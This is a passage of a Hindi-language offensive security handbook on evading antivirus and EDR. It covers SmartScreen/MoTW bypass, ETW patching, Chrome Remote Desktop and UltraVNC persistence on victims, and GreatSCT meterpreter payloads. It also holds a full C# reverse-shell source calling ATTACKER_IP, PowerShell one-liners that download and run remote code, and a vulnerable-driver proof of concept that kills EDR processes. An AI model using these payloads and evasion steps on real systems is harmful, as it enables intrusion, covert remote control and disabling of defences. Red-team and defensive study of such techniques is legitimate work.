> कई obfuscation techniques में data को encrypt किया जाता है, जिससे binary की entropy बढ़ जाती है और AVs तथा EDRs के लिए उसे detect करना आसान हो जाता है। इस बारे में सावधान रहें और हो सके तो encryption केवल अपने code के उन खास sections पर लागू करें जो sensitive हैं या जिन्हें छिपाने की ज़रूरत है।

### ConfuserEx-Protected .NET Binaries को Deobfuscate करना

ConfuserEx 2 (या commercial forks) का उपयोग करने वाले malware का analysis करते समय, अक्सर protection की कई layers मिलती हैं, जो decompilers और sandboxes को रोक देती हैं। नीचे दिया गया workflow भरोसेमंद तरीके से **लगभग original IL को restore करता है**, जिसे बाद में dnSpy या ILSpy जैसे tools में C# में decompile किया जा सकता है।<sup>[[10]](#references)</sup>

1.  Anti-tampering removal – ConfuserEx हर *method body* को encrypt करता है और उसे *module* static constructor (`<Module>.cctor`) के अंदर decrypt करता है। यह PE checksum को भी patch करता है, ताकि किसी भी modification से binary crash हो जाए। Encrypted metadata tables ढूँढ़ने, XOR keys recover करने और clean assembly को rewrite करने के लिए **AntiTamperKiller** का उपयोग करें:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Output में 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) होते हैं, जो आपका अपना unpacker बनाते समय उपयोगी हो सकते हैं।

2.  Symbol / control-flow recovery – *clean* file को **de4dot-cex** (de4dot का ConfuserEx-aware fork) को दें।
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flags:
     • `-p crx` – ConfuserEx 2 profile चुनें
     • de4dot control-flow flattening को उलट देगा, मूल namespaces, classes और variable names बहाल करेगा और constant strings को decrypt करेगा।

3.  Proxy-call stripping – ConfuserEx decompilation को और मुश्किल बनाने के लिए direct method calls को हल्के wrappers (जिन्हें *proxy calls* भी कहते हैं) से बदल देता है। इन्हें **ProxyCall-Remover** से हटाएँ:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   इस चरण के बाद आपको opaque wrapper functions (`Class8.smethod_10`, …) के बजाय सामान्य .NET API जैसे `Convert.FromBase64String` या `AES.Create()` दिखने चाहिए।

4.  Manual clean-up – परिणामी binary को dnSpy में चलाएँ और बड़े Base64 blobs या `RijndaelManaged`/`TripleDESCryptoServiceProvider` के उपयोग को खोजें, ताकि *असली* payload का पता लगाया जा सके। अक्सर malware इसे `<Module>.byte_0` के अंदर initialize किए गए TLV-encoded byte array के रूप में रखता है।

ऊपर दी गई chain, malicious sample चलाए बिना execution flow को पुनर्स्थापित करती है — offline workstation पर काम करते समय यह उपयोगी है।

> 🛈  ConfuserEx, `ConfusedByAttribute` नाम का एक custom attribute बनाता है, जिसका उपयोग samples की automatic triage के लिए IOC के रूप में किया जा सकता है।

#### वन-लाइनर
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): इस परियोजना का उद्देश्य [LLVM](http://www.llvm.org/) compilation suite का एक open-source fork उपलब्ध कराना है, जो [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) और tamper-proofing के ज़रिए software security को बेहतर बना सके।
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator दिखाता है कि किसी external tool का इस्तेमाल किए बिना और compiler में बदलाव किए बिना, compile time पर obfuscated code बनाने के लिए `C++11/14` language का उपयोग कैसे किया जा सकता है।
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming framework से generated obfuscated operations की एक layer जोड़ें, जिससे application को crack करने की कोशिश करने वाले व्यक्ति का काम थोड़ा कठिन हो जाएगा।
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz एक x64 binary obfuscator है, जो कई तरह की PE files को obfuscate कर सकता है, जिनमें .exe, .dll, .sys शामिल हैं।
- [**metame**](https://github.com/a0rtega/metame): Metame arbitrary executables के लिए एक सरल metamorphic code engine है।
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator, ROP (return-oriented programming) का उपयोग करके LLVM-supported languages के लिए एक fine-grained code obfuscation framework है। ROPfuscator regular instructions को ROP chains में बदलकर assembly code level पर program को obfuscate करता है, जिससे सामान्य control flow की हमारी सहज समझ बाधित होती है।
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt, Nim में लिखा गया .NET PE Crypter है।
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor मौजूदा EXE/DLL को shellcode में बदलकर फिर उसे load कर सकता है।

### LLVM compiler-assisted per-function self-masking

पूरे implant को केवल उसके सोते समय mask करने के बजाय, संशोधित LLVM X86 backend चुने हुए functions को निष्क्रिय रहने के दौरान XOR-masked रख सकता है। Function Peekaboo PoC, demangled names में `REG_` वाले functions चुनता है, अंतिम machine code के आसपास position-independent entry/exit stubs डालता है और `.text` में एक साझा masking handler emit करता है; source-level signatures और Windows x64 calling convention अपरिवर्तित रहते हैं।<sup>[[38]](#references)[[39]](#references)</sup>

#### Backend control-flow transformation

यह काम instruction selection और optimization के बाद होना चाहिए, क्योंकि transformation में **हर emitted return** शामिल होना चाहिए और x86 का सटीक layout पता होना चाहिए। एक pre-emission `MachineFunctionPass`, आखिरी `MachineInstr::isReturn()` ढूँढ़ता है और उसे हटा देता है, ताकि अंतिम path appended epilogue में चला जाए। वह पहले के returns को `JMP_1 handler` से बदल देता है। हर return से पहले compiler द्वारा generated stack/frame teardown को रहने दें; केवल return instruction को redirect करें।<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` और `emitFunctionBodyEnd()` per-function stubs emit करते हैं, जबकि `emitEndOfAsmFile()` handler emit करता है। Emission stages के बीच साझा symbols prologue branch को उसके बाद आने वाले epilogue तक पहुँचने देते हैं; manually emitted near `je` के लिए `0F 84` के बाद चार-byte MC expression `target - address_after_je` लिखें। Handler तक calls और jumps को `MCInst` objects (`CALL64pcrel32` और `JMP_1`) के रूप में emit किया जा सकता है। जब किसी function का चयन न हुआ हो और उसमें कोई बदलाव न किया गया हो, तो pass को `false` लौटाना चाहिए; PoC इस path पर गलत तरीके से `true` लौटाता है।<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata and pre-CRT initialization

PoC `.funcmeta` में एक XOR key और 16-byte records रखता है, जिनमें loader-relocated function pointer और runtime length शामिल होते हैं। C field `uint32_t` होने के बावजूद, handler record offset `+8` पर QWORD access करता है, जिससे length और उसकी padding दोनों पढ़ी जाती हैं, और records के बीच `0x10` आगे बढ़ता है। PE section names केवल आठ bytes के होते हैं, इसलिए runtime lookup में `.funcmet` दिखता है। एक external patcher executable `.stub` जोड़ता है, stub में पुराना entry-point RVA सहेजता है और `AddressOfEntryPoint` को redirect करता है; PIC stub `gs:[0x60]` → `[PEB+0x10]` से image base प्राप्त करता है, पहले से imported `VirtualProtect` को resolve करने के लिए PE32+ imports को traverse करता है और CRT से पहले चलता है।<sup>[[38]](#references)[[39]](#references)</sup>

Initialization `gs:[0xE8]` में एक sentinel सेट करता है और metadata के हर function को call करता है। उसका हमेशा readable prologue function start को `gs:[0xF0]` में दर्ज करता है, sentinel का पता लगाता है और अभी-clear body को छोड़ देता है। इसके बाद epilogue `call handler` का उपयोग करता है; handler द्वारा 13 registers (`0x68` bytes) सहेजने के बाद, `[rsp+0x68]` पर मौजूद return address transformed function का end होता है, इसलिए `end - start` को उसके metadata record में लिखा जा सकता है। सभी bodies को mask करने के बाद stub sentinel को साफ़ करता है और `ImageBase + original_entry_point_RVA` पर jump करता है।<sup>[[38]](#references)[[39]](#references)</sup>

सामान्य call के दौरान prologue body को decode करने के लिए उसी symmetric handler को call करता है। अंतिम path appended epilogue में चला जाता है, जबकि पहले के हर return सीधे साझा handler पर jump करते हैं। सामान्य epilogue भी `call` के बजाय `jmp handler` का उपयोग करता है, इसलिए re-masking के बाद handler का `ret` मूल caller का return address लेता है और function result को `RAX` में बनाए रखता है।<sup>[[38]](#references)[[39]](#references)</sup>

#### Masking primitive and analysis indicators

Handler मौजूदा record ढूँढ़ता है, fixed visible prologue (`इस build में 0x46` bytes) को छोड़ देता है, बाकी हिस्से को `PAGE_EXECUTE_READWRITE` में बदलता है, उसे byte-by-byte low key byte से XOR करता है और फिर `PAGE_EXECUTE_READ` पर सेट करता है। इसलिए वही loop entry पर decode करता है और हर सामान्य exit पर encode करता है।<sup>[[38]](#references)[[39]](#references)</sup>

इस design के high-signal indicators में शामिल हैं:<sup>[[38]](#references)[[39]](#references)</sup>

- executable `.stub` के भीतर entry point और key तथा relocated `.text` pointers रखने वाला `.funcmet` section;
- pre-CRT PEB, import-table और section-table parsing, जिसके बाद हर metadata pointer के ज़रिए calls किए जाते हैं;
- एक जैसे `call`/`pop` PIC prologues और कई return sites, जिन्हें एक ही handler पर redirect किया गया हो;
- `gs:[0xE8]`, `gs:[0xF0]` और `gs:[0xF8]` में writes, जिनके बाद बार-बार `VirtualProtect` transitions और image-backed executable pages में bytewise XOR writes हों।

यह memory-scanner evasion है, cryptographic protection नहीं: patched file में मूल clear body अब भी मौजूद रहती है, और debugger में `VirtualProtect` या XOR loop पर break करके active function को dump किया जा सकता है। Single-byte XOR, readable metadata और fixed `0x46` boundary के कारण offline recovery भी आसान हो जाती है।<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> PoC के TEB slots thread-local हैं, लेकिन modified code pages पूरे process में साझा होते हैं। इसलिए concurrent या recursive entry के दौरान instructions फिर से toggle हो सकते हैं, जबकि कोई दूसरा invocation उन्हें execute कर रहा हो; exceptions और nonlocal exits भी re-masking को bypass कर सकते हैं। एक robust implementation को transitions synchronize करने चाहिए, `lpflOldProtect` के ज़रिए लौटाई गई वास्तविक protection restore करनी चाहिए, hard-coded stub lengths से बचना चाहिए, x64 stack alignment के लिए `call` और `jmp` दोनों paths का audit करना चाहिए और executable bytes को दोबारा लिखने के बाद `FlushInstructionCache` call करना चाहिए। Microsoft स्पष्ट रूप से executable code में बदलाव होने पर instruction-cache coherency की ज़िम्मेदारी caller की बताता है।<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

हो सकता है आपने इंटरनेट से कुछ executables download करके उन्हें चलाते समय यह screen देखी हो।

Microsoft Defender SmartScreen एक security mechanism है, जिसका उद्देश्य end user को संभावित रूप से malicious applications चलाने से बचाना है।

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen मुख्य रूप से reputation-based approach पर काम करता है। यानी, जो applications आम तौर पर download नहीं की जातीं, वे SmartScreen को trigger करेंगी, जिससे end user को alert मिलेगा और file चलने से रोकी जाएगी (हालाँकि More Info -> Run anyway पर click करके file फिर भी चलाई जा सकती है)।

**MoTW** (Mark of The Web), Zone.Identifier नाम वाला [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) है, जो इंटरनेट से files download करने पर अपने-आप बनता है और उसमें download source का URL भी होता है।

<figure><img src="../images/image (237).png" alt=""><figcaption><p>इंटरनेट से download की गई file का Zone.Identifier ADS जाँचना।</p></figcaption></figure>

> [!TIP]
> ध्यान देने वाली बात है कि **trusted** signing certificate से signed executables **SmartScreen को trigger नहीं करेंगे**।

अपने payloads को Mark of The Web से बचाने का एक बहुत प्रभावी तरीका उन्हें ISO जैसे किसी container में package करना है। ऐसा इसलिए होता है क्योंकि Mark-of-the-Web (MOTW) को **non NTFS** volumes पर लागू **नहीं** किया जा सकता।

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) एक tool है, जो Mark-of-the-Web से बचने के लिए payloads को output containers में package करता है।

उदाहरण के तौर पर उपयोग:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

यह PackMyPayload का उपयोग करके ISO फ़ाइलों में payloads पैकेज करके SmartScreen को bypass करने का demo है [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW), Windows में एक शक्तिशाली logging mechanism है, जो applications और system components को **events log** करने देता है। हालांकि, security products इसका उपयोग malicious activities को monitor और detect करने के लिए भी कर सकते हैं।

AMSI को disable (bypass) करने की तरह, user space process के **`EtwEventWrite`** function को भी बिना कोई event log किए तुरंत return करने के लिए इस्तेमाल किया जा सकता है। इसके लिए memory में function को patch करके तुरंत return कराया जाता है, जिससे उस process के लिए ETW logging प्रभावी रूप से disable हो जाती है।

इस बारे में अधिक जानकारी **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) और [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** में मिल सकती है।<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

C# binaries को memory में load करने की तकनीक काफी समय से जानी जाती है और AV की पकड़ में आए बिना अपने post-exploitation tools चलाने का यह अब भी एक बहुत अच्छा तरीका है।

चूंकि payload सीधे memory में load होगा और disk को नहीं छुएगा, इसलिए हमें केवल पूरे process के लिए AMSI patch करने की चिंता करनी होगी।

अधिकांश C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, आदि) पहले से ही C# assemblies को सीधे memory में execute करने की सुविधा देते हैं, लेकिन ऐसा करने के अलग-अलग तरीके हैं:

- **Fork\&Run**

इसमें **एक नया sacrificial process शुरू करना**, अपने post-exploitation malicious code को उस नए process में inject करना, अपना malicious code execute करना और काम पूरा होने पर नए process को बंद करना शामिल है। इसके फायदे और नुकसान दोनों हैं। Fork and run method का फायदा यह है कि execution हमारे Beacon implant process के **बाहर** होता है। इसका मतलब है कि अगर हमारे post-exploitation action में कुछ गड़बड़ हो जाए या वह पकड़ में आ जाए, तो हमारे **implant के बचने की संभावना काफी अधिक** होती है। इसका नुकसान यह है कि **Behavioural Detections** द्वारा पकड़े जाने की **संभावना अधिक** होती है।

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

इसमें post-exploitation malicious code को **अपने ही process में** inject किया जाता है। इससे आप नया process बनाने और उसे AV से scan करवाने से बच सकते हैं, लेकिन नुकसान यह है कि payload के execution में कुछ गड़बड़ होने पर, उसके crash होने के कारण **अपना beacon खोने की संभावना काफी अधिक** होती है।

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> अगर आप C# Assembly loading के बारे में और पढ़ना चाहते हैं, तो यह article देखें [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) और उनका InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

आप C# Assemblies को **PowerShell से भी** load कर सकते हैं। [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) और [S3cur3th1sSh1t का video](https://www.youtube.com/watch?v=oe11Q-3Akuk) देखें।

## अन्य Programming Languages का उपयोग

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) में सुझाए गए तरीके के अनुसार, compromised machine को **Attacker Controlled SMB share पर install किए गए interpreter environment** तक access देकर अन्य languages का उपयोग करके malicious code execute करना संभव है।

SMB share पर Interpreter Binaries और environment का access देने से आप compromised machine की memory में इन languages में **arbitrary code execute** कर सकते हैं।

Repo के अनुसार: Defender अब भी scripts scan करता है, लेकिन Go, Java, PHP आदि का उपयोग करके हमारे पास **static signatures को bypass करने की अधिक flexibility** होती है। इन languages में random, un-obfuscated reverse shell scripts के साथ testing सफल रही है।

## TokenStomping

Token stomping, EDR या AV जैसे security product के access token में बदलाव करता है। Token के privileges कम करने से process चलता रह सकता है, जबकि उसे privileged inspection या remediation actions करने से रोका जा सकता है।

इसे रोकने के लिए Windows, **बाहरी processes को** security processes के tokens के handles प्राप्त करने से रोक सकता है।

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Trusted Software का उपयोग

### Chrome Remote Desktop

[**इस blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) में बताए अनुसार, victim के PC पर Chrome Remote Desktop deploy करना और फिर उसका उपयोग करके उस पर takeover करना तथा persistence बनाए रखना आसान है:<sup>[[35]](#references)</sup>
1. https://remotedesktop.google.com/ से download करें, "Set up via SSH" पर click करें, फिर Windows के लिए MSI file download करने हेतु MSI file पर click करें।
2. Victim पर installer को silently चलाएं (admin आवश्यक है): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop page पर वापस जाएं और next पर click करें। Wizard आपसे authorize करने को कहेगा; आगे बढ़ने के लिए Authorize button पर click करें।
4. दिए गए command को आवश्यक बदलावों के साथ execute करें: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (`--pin` parameter GUI का उपयोग किए बिना PIN set करता है)।
 

## Advanced Evasion

Evasion बहुत जटिल विषय है। कभी-कभी एक ही system में telemetry के कई अलग-अलग sources को ध्यान में रखना पड़ता है, इसलिए mature environments में पूरी तरह undetected रहना लगभग असंभव है।

आप जिस भी environment के विरुद्ध काम करेंगे, उसकी अपनी ताकतें और कमजोरियां होंगी।

मैं आपको [@ATTL4S](https://twitter.com/DaniLJ94) की यह talk देखने की ज़ोरदार सलाह देता हूं, ताकि Advanced Evasion techniques की शुरुआती समझ मिल सके।


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

यह [@mariuszbit](https://twitter.com/mariuszbit) की Evasion in Depth पर एक और बेहतरीन talk है।


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **पुरानी Techniques**

### **जांचें कि Defender किन हिस्सों को malicious मानता है**

आप [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) का उपयोग कर सकते हैं, जो **binary के हिस्सों को हटाता जाता है**, जब तक उसे **यह पता नहीं चल जाता कि Defender किस हिस्से को** malicious मान रहा है; फिर वह उस हिस्से को आपके लिए अलग कर देता है।\
**यही काम करने वाला** एक अन्य tool [**avred**](https://github.com/dobin/avred) है, जो [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) पर यह service open web पर उपलब्ध कराता है।

### **Telnet Server**

Windows10 तक, सभी Windows versions में एक **Telnet server** शामिल था, जिसे आप (administrator के रूप में) इस command से install कर सकते थे:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

सिस्टम शुरू होने पर इसे **शुरू** करें और इसे अभी **चलाएँ**:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**telnet port बदलें** (stealth) और firewall अक्षम करें:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

इसे यहाँ से डाउनलोड करें: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (आपको setup नहीं, bin downloads चाहिए)

**HOST पर**: _**winvnc.exe**_ चलाएँ और server configure करें:

- _Disable TrayIcon_ विकल्प enable करें
- _VNC Password_ में password सेट करें
- _View-Only Password_ में password सेट करें

फिर, binary _**winvnc.exe**_ और **नई बनाई गई** file _**UltraVNC.ini**_ को **victim** के अंदर ले जाएँ

#### **Reverse connection**

**attacker** को अपने **host** पर binary `vncviewer.exe -listen 5900` **चलानी** चाहिए, ताकि वह reverse **VNC connection** प्राप्त करने के लिए **तैयार** रहे। फिर, **victim** के अंदर: winvnc daemon `winvnc.exe -run` शुरू करें और `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` चलाएँ

**चेतावनी:** stealth बनाए रखने के लिए कुछ काम न करें

- अगर `winvnc` पहले से चल रहा है, तो उसे शुरू न करें, वरना [popup](https://i.imgur.com/1SROTTl.png) दिखाई देगा। `tasklist | findstr winvnc` से जाँचें कि वह चल रहा है या नहीं
- `UltraVNC.ini` को उसी directory में रखे बिना `winvnc` शुरू न करें, वरना [config window](https://i.imgur.com/rfMQWcf.png) खुल जाएगी
- मदद के लिए `winvnc -h` न चलाएँ, वरना [popup](https://i.imgur.com/oc18wcu.png) दिखाई देगा

### GreatSCT

इसे यहाँ से डाउनलोड करें: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

GreatSCT के अंदर:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

अब `msfconsole -r file.rc` के साथ **lister** शुरू करें और **xml payload** को इस तरह **execute** करें:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**मौजूदा Defender प्रोसेस को बहुत तेज़ी से terminate कर देगा।**

### अपना reverse shell compile करना

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### पहला C# Revershell

इसे compile करें:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

इसके साथ इसका उपयोग करें:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# कंपाइलर का उपयोग

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

स्वचालित डाउनलोड और निष्पादन:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators की सूची: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

### injectors बनाने के लिए Python का उपयोग करने का उदाहरण:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### अन्य टूल्स

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### अधिक

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## अपना Vulnerable Driver लाएँ (BYOVD) – Kernel Space से AV/EDR को खत्म करना

Storm-2603 ने ransomware तैनात करने से पहले endpoint सुरक्षा को निष्क्रिय करने के लिए **Antivirus Terminator** नाम की एक छोटी console utility का इस्तेमाल किया। यह टूल अपना **vulnerable लेकिन *signed* driver** साथ लाता है और उसका दुरुपयोग करके privileged kernel operations करता है, जिन्हें Protected-Process-Light (PPL) AV services भी रोक नहीं सकतीं।<sup>[[12]](#references)</sup>

मुख्य बातें
1. **Signed driver**: डिस्क पर डिलीवर की गई फ़ाइल `ServiceMouse.sys` है, लेकिन binary, Antiy Labs के “System In-Depth Analysis Toolkit” का वैध रूप से signed driver `AToolsKrnl64.sys` है। चूँकि driver पर Microsoft का मान्य signature है, इसलिए Driver-Signature-Enforcement (DSE) सक्षम होने पर भी यह लोड हो जाता है।
2. **Service installation**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   पहली लाइन driver को **kernel service** के रूप में रजिस्टर करती है और दूसरी उसे शुरू करती है, जिससे `\\.\ServiceMouse` user land से ऐक्सेस किया जा सकता है।
3. **driver द्वारा उपलब्ध कराए गए IOCTLs**
   | IOCTL code | क्षमता                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | PID के ज़रिए किसी भी process को terminate करना (Defender/EDR services को kill करने के लिए उपयोग किया जाता है) |
   | `0x990000D0` | disk पर मौजूद किसी भी file को delete करना |
   | `0x990001D0` | driver को unload करना और service को remove करना |

   न्यूनतम C proof-of-concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
